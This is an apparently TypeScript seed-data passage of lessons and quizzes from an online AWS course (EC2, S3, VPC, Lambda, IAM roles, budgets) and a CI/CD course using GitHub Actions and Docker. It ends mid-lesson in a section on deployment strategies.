      title: 'EC2 Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does an AMI provide when launching an EC2 instance?',
          options: ['A security group', 'A template including an OS and optionally pre-installed software', 'A billing alert', 'A VPC'],
          answer: 'A template including an OS and optionally pre-installed software',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Security groups require a separate outbound rule to allow response traffic for an allowed inbound connection.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A security group can only specify what traffic to ____, it has no explicit deny rules.',
          options: [],
          answer: 'allow',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What problem does an Elastic IP solve?',
          options: [
            "An instance's public IP normally changes on stop/start, an Elastic IP stays the same",
            'It encrypts network traffic',
            'It replaces the need for a security group',
            'It automatically scales instances',
          ],
          answer: "An instance's public IP normally changes on stop/start, an Elastic IP stays the same",
        },
        {
          type: 'TRUE_FALSE',
          prompt: "You should rely on a single EC2 instance's Elastic IP for a long-running, public-facing service instead of using a load balancer.",
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The AWS SSH credential used to log into an instance is called a ____ pair.',
          options: [],
          answer: 'key',
        },
      ],
    },
  },
  {
    title: 'S3: Object Storage',
    content: lessonContent(
      'S3: Object Storage',
      `**S3 (Simple Storage Service)** stores files (called **objects**) inside **buckets**. It's not a filesystem or a database, it's built for storing and retrieving whole objects (images, backups, static files, logs) at massive scale and very high durability.\n\n## Buckets and objects\n\n\`\`\`bash\naws s3 mb s3://my-app-uploads\naws s3 cp photo.jpg s3://my-app-uploads/users/42/photo.jpg\naws s3 ls s3://my-app-uploads/users/42/\n\`\`\`\n\n- A **bucket** name must be globally unique across all of AWS, not just your account.\n- An **object key** (\`users/42/photo.jpg\`) looks like a file path, but S3 has no real folders, it's really just one flat namespace of keys that happens to use \`/\` as a visual separator in the console.\n\n## Storage classes\n\nNot all data needs to be equally fast to access. S3 offers multiple **storage classes** with different cost/retrieval-speed tradeoffs:\n\n| Class | Use case |\n|---|---|\n| Standard | Frequently accessed data |\n| Standard-IA (Infrequent Access) | Accessed rarely, but needs to be available instantly when it is |\n| Glacier | Long-term archives, retrieval takes minutes to hours, much cheaper storage |\n\nYou can set a **lifecycle rule** to automatically move objects to a cheaper class (or delete them) after a certain age, e.g. move logs to Glacier after 90 days.\n\n## Versioning and static website hosting\n\nEnabling **versioning** on a bucket keeps every version of an object instead of overwriting it, protecting against accidental deletes/overwrites (at the cost of storing every version).\n\nS3 can also serve static files directly as a website:\n\n\`\`\`bash\naws s3 website s3://my-site --index-document index.html --error-document 404.html\n\`\`\`\n\n## Bucket policies\n\nA **bucket policy** is a JSON document (using the same policy language as IAM) attached directly to a bucket, controlling who can access it:\n\n\`\`\`json\n{\n  "Version": "2012-10-17",\n  "Statement": [\n    {\n      "Effect": "Allow",\n      "Principal": "*",\n      "Action": "s3:GetObject",\n      "Resource": "arn:aws:s3:::my-site/*"\n    }\n  ]\n}\n\`\`\`\n\n> [!WARNING]\n> A bucket policy with \`"Principal": "*"\` and \`s3:GetObject\` makes every object in that bucket **publicly readable by anyone on the internet**, exactly what you want for a public website's assets, and exactly what you very much don't want for a bucket holding user data or backups. Misconfigured public buckets are one of the most common real-world AWS security incidents.`
    ),
    quiz: {
      title: 'S3 Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What must be globally unique across all of AWS, not just your account?',
          options: ['An object key', 'A bucket name', 'An IAM user', 'A security group'],
          answer: 'A bucket name',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'S3 has real, nested folders, similar to a traditional filesystem.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'An S3 ____ rule can automatically move objects to a cheaper storage class or delete them after a certain age.',
          options: [],
          answer: 'lifecycle',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which storage class is meant for long-term archives with retrieval taking minutes to hours?',
          options: ['Standard', 'Standard-IA', 'Glacier', 'ClusterIP'],
          answer: 'Glacier',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Enabling versioning on a bucket keeps every version of an object instead of overwriting it.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does a bucket policy with Principal: * and s3:GetObject do?',
          options: [
            'Deletes the bucket',
            'Makes every object in the bucket publicly readable by anyone',
            'Encrypts all objects',
            'Restricts access to your account only',
          ],
          answer: 'Makes every object in the bucket publicly readable by anyone',
        },
      ],
    },
  },
  {
    title: 'VPC: Networking Your Resources',
    content: lessonContent(
      'VPC: Networking Your Resources',
      `A **VPC (Virtual Private Cloud)** is your own private, isolated slice of the AWS network, where you control IP ranges, subnets, and routing for everything you launch inside it.\n\n## Subnets: public vs. private\n\nA VPC is divided into **subnets**, and each subnet is either:\n- **Public**: has a route to an **Internet Gateway**, so resources in it can be reached from (and reach) the public internet directly.\n- **Private**: has no direct route to the internet, used for things that should never be directly reachable, like a database.\n\n\`\`\`\nVPC: 10.0.0.0/16\n  Public subnet:  10.0.1.0/24   (web servers, load balancers)\n  Private subnet: 10.0.2.0/24   (databases, internal services)\n\`\`\`\n\nA common, secure pattern: put your load balancer and web servers in a public subnet, and your database in a private subnet that's only reachable from inside the VPC.\n\n## Route tables and the Internet Gateway\n\nA **route table** is a set of rules deciding where network traffic from a subnet gets sent. What makes a subnet "public" isn't a special setting, it's simply that its route table sends \`0.0.0.0/0\` (all other traffic) to an **Internet Gateway** attached to the VPC:\n\n\`\`\`\nDestination      Target\n10.0.0.0/16       local\n0.0.0.0/0         igw-0123456789\n\`\`\`\n\n## NAT Gateway: outbound internet for private subnets\n\nResources in a private subnet still often need **outbound** internet access (to download OS updates, call an external API), without being directly reachable from the internet. A **NAT Gateway**, placed in a public subnet, provides exactly that: private-subnet resources route outbound traffic through it, but nothing from the internet can initiate a connection back in.\n\n\`\`\`\nPrivate subnet route table:\nDestination      Target\n10.0.0.0/16       local\n0.0.0.0/0         nat-0123456789\n\`\`\`\n\n> [!NOTE]\n> This public-subnet/private-subnet/NAT-gateway pattern is extremely common, it's the default shape of almost every "real" production VPC: internet-facing things sit in public subnets, everything else sits in private subnets with outbound-only access through a NAT Gateway.`
    ),
    quiz: {
      title: 'VPC Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What makes a subnet 'public' in AWS?",
          options: [
            'Its name contains the word public',
            'Its route table sends internet-bound traffic to an Internet Gateway',
            'It has no security group',
            'It is the first subnet created',
          ],
          answer: 'Its route table sends internet-bound traffic to an Internet Gateway',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A database should typically be placed in a public subnet so it is easy to reach.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A ____ Gateway lets resources in a private subnet make outbound internet connections without being directly reachable from the internet.',
          options: [],
          answer: 'NAT',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is a route table?',
          options: [
            'A firewall rule list',
            "A set of rules deciding where a subnet's network traffic gets sent",
            'An IAM policy',
            'A DNS record',
          ],
          answer: "A set of rules deciding where a subnet's network traffic gets sent",
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Traffic from the internet can freely initiate new connections into a private subnet through a NAT Gateway.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A VPC is your own private, isolated slice of the AWS ____, where you control IP ranges and routing.',
          options: [],
          answer: 'network',
        },
      ],
    },
  },
  {
    title: 'Serverless with Lambda and API Gateway',
    content: lessonContent(
      'Serverless with Lambda and API Gateway',
      `So far every service has meant managing a running server (EC2 instances, at minimum). **Lambda** flips that: you upload a function, and AWS runs it only when triggered, you never provision or manage a server at all.\n\n## Writing a Lambda function\n\n\`\`\`\nexports.handler = async (event) => {\n  const name = event.queryStringParameters?.name ?? 'world';\n  return {\n    statusCode: 200,\n    headers: { 'Content-Type': 'application/json' },\n    body: JSON.stringify({ message: \`Hello, \${name}!\` }),\n  };\n};\n\`\`\`\n\nA Lambda function is just a handler function with a defined input (\`event\`) and output shape, AWS packages it, runs it in an isolated environment, and you're billed per invocation and per millisecond of execution time, nothing while it's idle.\n\n## Triggers\n\nLambda functions don't run on their own, something has to **invoke** them:\n\n| Trigger | Use case |\n|---|---|\n| API Gateway | Turn a function into an HTTP endpoint |\n| S3 event | Run a function whenever a file is uploaded to a bucket |\n| Scheduled (EventBridge) | Run a function on a cron-like schedule |\n| SQS queue | Process messages from a queue as they arrive |\n\n## API Gateway: HTTP in front of Lambda\n\n**API Gateway** is what turns a Lambda function into a real REST API with a public URL, handling routing, request validation, throttling, and API keys in front of your function.\n\n\`\`\`\nGET /hello  →  API Gateway  →  Lambda (handler above)  →  response\n\`\`\`\n\nYou define routes in API Gateway, each one maps to a Lambda function (or another backend), API Gateway handles the HTTP layer, your function just receives a plain JavaScript object describing the request.\n\n## Cold starts\n\nThe tradeoff for not managing servers: the **first** invocation after a period of inactivity has to initialize a fresh execution environment before running your code, called a **cold start**, adding noticeable latency (tens to hundreds of milliseconds, sometimes more for larger runtimes/dependencies). Subsequent invocations reuse a warm environment and are fast.\n\n> [!TIP]\n> If cold-start latency matters for your use case (a user-facing API with strict latency requirements), keep your function's dependencies small, and consider **provisioned concurrency**, which keeps a set number of execution environments pre-warmed at all times, for an additional cost.`
    ),
    quiz: {
      title: 'Lambda & API Gateway Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What do you pay for with AWS Lambda?',
          options: [
            'A fixed monthly fee regardless of usage',
            'Only invocations and execution time, nothing while idle',
            'Only the size of the deployed code',
            'A flat per-server cost like EC2',
          ],
          answer: 'Only invocations and execution time, nothing while idle',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does API Gateway do for a Lambda function?',
          options: [
            "Encrypts the function's code",
            'Turns it into a real HTTP endpoint with routing, throttling, and more',
            'Automatically writes the function for you',
            'Replaces the need for IAM',
          ],
          answer: 'Turns it into a real HTTP endpoint with routing, throttling, and more',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A Lambda function can only be triggered by API Gateway, no other AWS service.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The extra latency on the first invocation after inactivity, while a fresh execution environment initializes, is called a ____ start.',
          options: [],
          answer: 'cold',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Provisioned concurrency keeps a set number of execution environments pre-warmed to reduce cold starts, at an additional cost.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which trigger would you use to run a Lambda function whenever a file is uploaded to a bucket?',
          options: ['API Gateway', 'S3 event', 'SQS queue', 'EC2 instance'],
          answer: 'S3 event',
        },
      ],
    },
  },
  {
    title: 'IAM Roles, Billing, and the Well-Architected Basics',
    content: lessonContent(
      'IAM Roles, Billing, and the Well-Architected Basics',
      `Two last practical topics that matter on every real AWS project: giving your compute the right permissions without hardcoding credentials, and not getting an unpleasant billing surprise.\n\n## IAM roles for services, not just people\n\nThe single most important AWS security habit: an EC2 instance or Lambda function should be given an **IAM role**, not a hardcoded access key, to call other AWS services.\n\n\`\`\`\nLambda function → assumes an IAM Role → temporary credentials → calls S3, DynamoDB, etc.\n\`\`\`\n\nThe role is attached to the Lambda function (or EC2 instance) itself, AWS automatically provides temporary, auto-rotating credentials to your code, your application code never sees or stores a long-lived secret at all.\n\n\`\`\`\n{\n  "Effect": "Allow",\n  "Action": ["s3:GetObject", "s3:PutObject"],\n  "Resource": "arn:aws:s3:::my-app-uploads/*"\n}\n\`\`\`\n\nAttach this policy to the Lambda's execution role, and the function can read/write that one bucket, and nothing else, without a single access key in its code or environment variables.\n\n## Budgets and cost alerts\n\nAWS bills for exactly what you use, which is powerful but means an unexpected spike (a runaway loop calling an expensive API, a forgotten large instance) shows up on your bill, not before it happens. **AWS Budgets** lets you set a threshold and get alerted (or even trigger an action) before costs run away:\n\n\`\`\`\nBudget: $50/month\nAlert at: 80% ($40) and 100% ($50)\n\`\`\`\n\nSetting at least one budget alert on any real account, even a generous one, is a cheap insurance policy against a costly surprise.\n\n## The Well-Architected Framework, briefly\n\nAWS's **Well-Architected Framework** organizes best practices into six pillars:\n\n| Pillar | Cares about |\n|---|---|\n| Operational Excellence | Running and monitoring systems, learning from operations |\n| Security | Protecting data, systems, and assets |\n| Reliability | Recovering from failure, meeting demand |\n| Performance Efficiency | Using resources efficiently as demand changes |\n| Cost Optimization | Avoiding unnecessary spend |\n| Sustainability | Minimizing environmental impact |\n\nYou don't need to memorize the framework in depth this early, but recognizing the six pillars helps you understand *why* AWS documentation and architecture reviews keep bringing up the same handful of concerns.\n\n> [!NOTE]\n> Everything in this course so far, IAM roles over hardcoded keys, private subnets for databases, budgets, multi-AZ deployments, is really just the Security, Reliability, and Cost Optimization pillars in practice.`
    ),
    quiz: {
      title: 'IAM Roles & Billing Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What should an EC2 instance or Lambda function use to call other AWS services, instead of a hardcoded access key?',
          options: ['A public S3 bucket', 'An IAM role', 'A NAT Gateway', 'A security group'],
          answer: 'An IAM role',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Credentials provided to a service through an IAM role are temporary and auto-rotating.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'AWS ____ lets you set a spending threshold and get alerted before costs run away.',
          options: [],
          answer: 'Budgets',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'How many pillars does the AWS Well-Architected Framework have?',
          options: ['3', '4', '5', '6'],
          answer: '6',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'AWS bills a fixed amount regardless of how many resources you actually use.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Protecting data, systems, and assets is the concern of the ____ pillar in the Well-Architected Framework.',
          options: [],
          answer: 'Security',
        },
      ],
    },
  },
  {
    title: 'Final Project: Deploy a Serverless API on AWS',
    content: lessonContent(
      'Final Project: Deploy a Serverless API on AWS',
      `Combine IAM, Lambda, API Gateway, and S3 into one real, working serverless API.\n\n## Requirements\n\n1. Write at least two Lambda functions (e.g. a \`GET /items\` and a \`POST /items\`) and expose them through API Gateway with real routes.\n2. Give each Lambda function's execution role only the specific permissions it needs (e.g. the write function gets \`s3:PutObject\`, the read function only gets \`s3:GetObject\`), not broad admin access.\n3. Store data in S3 (as JSON objects) or another AWS data store of your choice, read and written through your Lambda functions, not hardcoded.\n4. Set up at least one AWS Budget alert on the account you're using, even a small one, as practice for a real project.\n5. Document your architecture (which resources you created and how they connect) in a short README.\n\n## Stretch goals\n\n- Put your S3 bucket behind a bucket policy that blocks all public access, and confirm your Lambda functions can still read/write it via their IAM role.\n- Add a scheduled (EventBridge) Lambda function that runs on a timer, e.g. cleaning up old data.\n- Put your whole setup in a VPC with a private subnet, and give your Lambda functions VPC access to reach a resource that isn't publicly exposed.\n\nSubmit a link to your finished project (a repo, or a written architecture summary with screenshots of your working API) below, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const cicdLessons: SeedLesson[] = [
  {
    title: 'What is CI/CD? From Manual Deploys to Pipelines',
    content: lessonContent(
      'What is CI/CD? From Manual Deploys to Pipelines',
      `Before CI/CD, shipping code usually meant someone manually running tests, building the app, and copying files to a server, slow, error-prone, and something only whoever "knows the deploy steps" can safely do. **CI/CD** automates that entire path from commit to running in production.\n\n## Continuous Integration (CI)\n\n**CI** means every change gets automatically built and tested the moment it's pushed, catching integration problems (two people's changes conflicting, a change breaking existing behavior) within minutes instead of days.\n\n\`\`\`\nPush code → CI server checks it out → installs deps → runs tests → reports pass/fail\n\`\`\`\n\nThe core promise of CI: nobody merges code that doesn't pass the automated checks, so \`main\` stays in a known-good state.\n\n## Continuous Delivery vs. Continuous Deployment\n\nThese two terms are often confused, and the difference matters:\n\n| Term | What happens after CI passes |\n|---|---|\n| **Continuous Delivery** | A deployable build is produced and ready to ship, a human clicks a button to actually release it |\n| **Continuous Deployment** | Every change that passes CI is deployed to production automatically, no human in the loop |\n\nBoth require the same underlying automation (build, test, package), Continuous Deployment just removes the manual approval step entirely, appropriate once you trust your test suite and rollback process enough.\n\n## Why automate this at all\n\n- **Speed**: changes reach users in minutes/hours instead of a scheduled weekly release.\n- **Consistency**: the exact same automated steps run every time, no "it worked on my machine" deploy.\n- **Confidence**: a broken build is caught immediately, by CI, not discovered by a user in production.\n- **Auditability**: every deploy has a record of exactly what changed, what tests ran, and who approved it.\n\n> [!NOTE]\n> "Pipeline" is the general term for the sequence of automated steps (build → test → package → deploy), and it's the central concept the rest of this course builds on, concretely, with GitHub Actions.`
    ),
    quiz: {
      title: 'CI/CD Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the core promise of Continuous Integration?',
          options: [
            'Every deploy is manual',
            'Nobody merges code that fails automated checks, keeping main in a known-good state',
            'Tests are optional',
            'Deploys happen once a month',
          ],
          answer: 'Nobody merges code that fails automated checks, keeping main in a known-good state',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the key difference between Continuous Delivery and Continuous Deployment?',
          options: [
            'There is no difference',
            'Continuous Deployment removes the manual approval step before releasing to production',
            'Continuous Delivery does not run tests',
            'Continuous Deployment only works with Docker',
          ],
          answer: 'Continuous Deployment removes the manual approval step before releasing to production',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Continuous Delivery means every passing change is automatically deployed to production with no human approval.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The general term for the sequence of automated build/test/package/deploy steps is a ____.',
          options: [],
          answer: 'pipeline',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A key benefit of CI is that broken code is caught immediately by automation rather than discovered by a user in production.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which of these is NOT typically a benefit of automating CI/CD?',
          options: ['Speed', 'Consistency', 'Auditability', 'Eliminating the need for any tests'],
          answer: 'Eliminating the need for any tests',
        },
      ],
    },
  },
  {
    title: 'Building a Pipeline with GitHub Actions',
    content: lessonContent(
      'Building a Pipeline with GitHub Actions',
      `**GitHub Actions** is GitHub's built-in CI/CD system: workflows defined as YAML files living right in your repository, triggered automatically by events like a push or pull request.\n\n## Anatomy of a workflow\n\n\`\`\`yaml\n# .github/workflows/ci.yml\nname: CI\n\non:\n  push:\n    branches: [main]\n  pull_request:\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n      - run: npm ci\n      - run: npm test\n\`\`\`\n\n- \`on\` defines the **triggers**, here, every push to \`main\` and every pull request.\n- \`jobs\` is a set of independent units of work, each runs on a fresh **runner** (a temporary VM, \`ubuntu-latest\` here).\n- \`steps\` run in order within a job, each is either a shell command (\`run:\`) or a reusable **action** (\`uses:\`), a packaged, shareable step someone else already wrote.\n\n## Reusable actions\n\n\`actions/checkout@v4\` and \`actions/setup-node@v4\` are official actions maintained by GitHub, \`checkout\` clones your repo onto the runner (without it, the runner starts with an empty filesystem), \`setup-node\` installs a specific Node.js version. The GitHub Marketplace has thousands of community actions for almost anything (deploying to a cloud provider, sending a Slack notification, scanning for vulnerabilities).\n\n## Multiple jobs and dependencies\n\n\`\`\`yaml\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps: [...]\n\n  deploy:\n    needs: test\n    runs-on: ubuntu-latest\n    steps: [...]\n\`\`\`\n\n\`needs: test\` makes the \`deploy\` job wait for \`test\` to succeed first, and skips \`deploy\` entirely if \`test\` fails. Jobs without a \`needs\` relationship run in **parallel** by default, useful for running lint, unit tests, and type-checking simultaneously to get feedback faster.\n\n> [!TIP]\n> Keep your CI fast. A pipeline people are used to waiting 15 minutes for gets ignored or worked around, one that takes 90 seconds gets checked every time, run independent jobs in parallel, and cache dependencies (next lesson) wherever you can.`
    ),
    quiz: {
      title: 'GitHub Actions Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What does the 'on' key in a GitHub Actions workflow define?",
          options: ['Which runner to use', 'The events that trigger the workflow', 'The programming language', 'The deployment target'],
          answer: 'The events that trigger the workflow',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The actions/____@v4 action clones your repository onto the runner, without it the runner starts with an empty filesystem.',
          options: [],
          answer: 'checkout',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Jobs in a workflow run in parallel by default unless one specifies needs to depend on another.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What happens to a job with needs: test if the test job fails?',
          options: ['It runs anyway', 'It is skipped', 'It runs twice', 'It automatically fixes the test'],
          answer: 'It is skipped',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A runner is a persistent, long-lived server that keeps state between workflow runs.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A packaged, reusable workflow step that someone else already wrote, referenced with uses:, is called an ____.',
          options: [],
          answer: 'action',
        },
      ],
    },
  },
  {
    title: 'Automated Testing in the Pipeline',
    content: lessonContent(
      'Automated Testing in the Pipeline',
      `A pipeline that doesn't run your test suite isn't really "CI", it's just automated building. This lesson covers making tests a real, fast, reliable gate in your pipeline.\n\n## Fail fast\n\n\`\`\`yaml\njobs:\n  ci:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with: { node-version: '20' }\n      - run: npm ci\n      - run: npm run lint\n      - run: npm run typecheck\n      - run: npm test\n\`\`\`\n\nSteps run in order and **stop at the first failure** by default, if \`npm run lint\` fails, \`npm test\` never runs, no point spending minutes running a full test suite against code that doesn't even pass linting.\n\n## Caching dependencies\n\nReinstalling every dependency from scratch on every single run wastes minutes per build, adding up fast across a busy repository. Caching the package manager's download cache (not \`node_modules\` itself, which can hide subtle bugs if reused stale) speeds this up significantly:\n\n\`\`\`yaml\n- uses: actions/setup-node@v4\n  with:\n    node-version: '20'\n    cache: 'npm'\n\`\`\`\n\n\`setup-node\`'s built-in \`cache: 'npm'\` option automatically caches and restores npm's download cache between runs, keyed on your lockfile, install still runs, but mostly from local cache instead of re-downloading everything.\n\n## Test matrices\n\nTo verify your code works across multiple versions or environments, define a **matrix**, GitHub Actions runs the job once per combination automatically:\n\n\`\`\`yaml\njobs:\n  test:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        node-version: ['18', '20', '22']\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: \${{ matrix.node-version }}\n      - run: npm ci && npm test\n\`\`\`\n\nThis runs the exact same job three times, once per Node version, in parallel, catching version-specific breakage before a user does.\n\n> [!WARNING]\n> A flaky test (one that sometimes fails for no code-related reason, a timing issue, a shared test database) is worse than a slow test, it trains your team to re-run failed pipelines out of habit instead of trusting red as "something is actually wrong". Fix or quarantine flaky tests aggressively.`
    ),
    quiz: {
      title: 'Automated Testing Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'TRUE_FALSE',
          prompt: 'By default, if an earlier step in a job fails, later steps in that same job still run.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What does setup-node's cache: 'npm' option do?",
          options: [
            'Caches node_modules directly',
            "Caches npm's download cache, keyed on your lockfile",
            'Skips running npm install entirely',
            'Disables tests',
          ],
          answer: "Caches npm's download cache, keyed on your lockfile",
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A strategy: ____ block runs the same job multiple times, once per combination of specified values (like Node versions).',
          options: [],
          answer: 'matrix',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Caching node_modules directly, rather than the package manager download cache, can hide subtle bugs if reused stale.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why is a flaky test considered worse than a slow one?',
          options: ['It costs more money', 'It trains the team to distrust and ignore failures', 'It cannot be fixed', 'It only affects one branch'],
          answer: 'It trains the team to distrust and ignore failures',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Running lint and typecheck before the full test suite, so a broken build fails immediately, is often called failing ____.',
          options: [],
          answer: 'fast',
        },
      ],
    },
  },
  {
    title: 'Build Artifacts and Docker Images in CI',
    content: lessonContent(
      'Build Artifacts and Docker Images in CI',
      `Once tests pass, most pipelines produce something deployable, a compiled binary, a bundled frontend, or, very commonly today, a **Docker image**. This lesson builds and pushes one from CI.\n\n## Building and pushing an image\n\n\`\`\`yaml\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Log in to registry\n        uses: docker/login-action@v3\n        with:\n          username: \${{ secrets.REGISTRY_USER }}\n          password: \${{ secrets.REGISTRY_TOKEN }}\n      - name: Build and push\n        run: |\n          docker build -t myregistry/web:\${{ github.sha }} .\n          docker push myregistry/web:\${{ github.sha }}\n\`\`\`\n\n\`secrets.REGISTRY_USER\`/\`REGISTRY_TOKEN\` pull encrypted repository secrets into the workflow at runtime, never hardcode credentials directly in the YAML (covered in more depth in the secrets-management lesson).\n\n## Tagging strategy\n\nTagging every image build matters more than it looks: it's how you know exactly what's running, and how you roll back.\n\n| Tag style | Example | Tradeoff |\n|---|---|---|\n| Commit SHA | \`web:a1b2c3d\` | Always unique, traces directly to exact code, not human-friendly |\n| Semantic version | \`web:1.4.2\` | Human-friendly, requires a versioning/release process |\n| \`latest\` | \`web:latest\` | Convenient, but ambiguous, "latest" changes meaning over time, avoid for production deploys |\n\nA common, robust approach: always tag with the commit SHA (guaranteed unique, always traceable), and *additionally* tag stable releases with a semantic version for human readability.\n\n## Uploading build artifacts\n\nNot every pipeline needs a Docker image, sometimes you just need to pass a build output (a compiled bundle, a test report) from one job to another:\n\n\`\`\`yaml\n- uses: actions/upload-artifact@v4\n  with:\n    name: dist\n    path: dist/\n\n# in a later job:\n- uses: actions/download-artifact@v4\n  with:\n    name: dist\n\`\`\`\n\n> [!NOTE]\n> Artifacts uploaded with \`upload-artifact\` are how you pass files **between jobs** in the same workflow run (each job gets its own fresh runner with no shared filesystem), it's not for long-term storage, that's what a registry or object storage (like S3) is for.`
    ),
    quiz: {
      title: 'Build Artifacts & Images Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why should you avoid deploying with only the latest tag in production?',
          options: [
            'latest is not a valid Docker tag',
            'latest is ambiguous and changes meaning over time',
            'latest images are always broken',
            'Docker does not support tags',
          ],
          answer: 'latest is ambiguous and changes meaning over time',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Tagging a Docker image with the commit ____ guarantees a unique tag that always traces back to the exact code that built it.',
          options: [],
          answer: 'SHA',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Repository secrets like registry credentials should be hardcoded directly into the workflow YAML for simplicity.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is actions/upload-artifact used for?',
          options: ['Deploying to production', 'Passing files between jobs in the same workflow run', 'Encrypting secrets', 'Building Docker images'],
          answer: 'Passing files between jobs in the same workflow run',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Each job in a workflow run gets its own fresh runner with no filesystem shared with other jobs by default.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What's a common, robust Docker tagging approach?",
          options: [
            'Only ever use latest',
            'Tag with the commit SHA always, and additionally a semantic version for stable releases',
            'Never tag images',
            'Use a random UUID for every tag',
          ],
          answer: 'Tag with the commit SHA always, and additionally a semantic version for stable releases',
        },
      ],
    },
  },
  {
    title: 'Continuous Deployment Strategies',
    content: lessonContent(
      'Continuous Deployment Strategies',
      `Getting a new build out doesn't have to mean "stop the old version, start the new one" (and the downtime that implies). Different deployment strategies trade off complexity for safety and zero-downtime releases.\n\n## Rolling deployment\n\nReplace old instances/Pods with new ones gradually, a few at a time, as covered in the Kubernetes course's Deployments lesson, this is the default behavior for a Kubernetes Deployment. At any moment, some traffic hits the old version and some hits the new one.\n\n## Blue-green deployment\n\nRun two full, identical environments, **blue** (currently live) and **green** (the new version), deploy entirely to green, test it for real, then switch all traffic over atomically:\n\n\`\`\`\nBefore:  Router → Blue (v1.4)     Green (v1.5, idle)\nSwitch:  Router → Blue (v1.4, idle)     Green (v1.5)\n\`\`\`\n\nIf something's wrong with green, you switch traffic straight back to blue, instant rollback, no redeploying anything. The cost: you need double the infrastructure running during the switch.\n\n## Canary deployment\n\nSend a small percentage of real traffic (say 5%) to the new version, watch error rates and latency, then gradually increase that percentage if everything looks healthy:\n\n\`\`\`\n5% of traffic  → v1.5 (canary)\n95% of traffic → v1.4 (stable)\n\`\`\`\n\nThis catches problems that only show up under real production traffic and load, while limiting the blast radius to a small slice of users if something's wrong.\n\n## Feature flags: decoupling deploy from release\n\nA **feature flag** wraps new code in a runtime toggle, so the code can be deployed to production while still being turned *off* for real users:\n\n\`\`\`\nif (featureFlags.isEnabled('new-checkout')) {\n  return renderNewCheckout();\n}\nreturn renderOldCheckout();\n\`\`\`\n\nThis separates two things that rolling/blue-green/canary strategies bundle together: *deploying* code (getting it 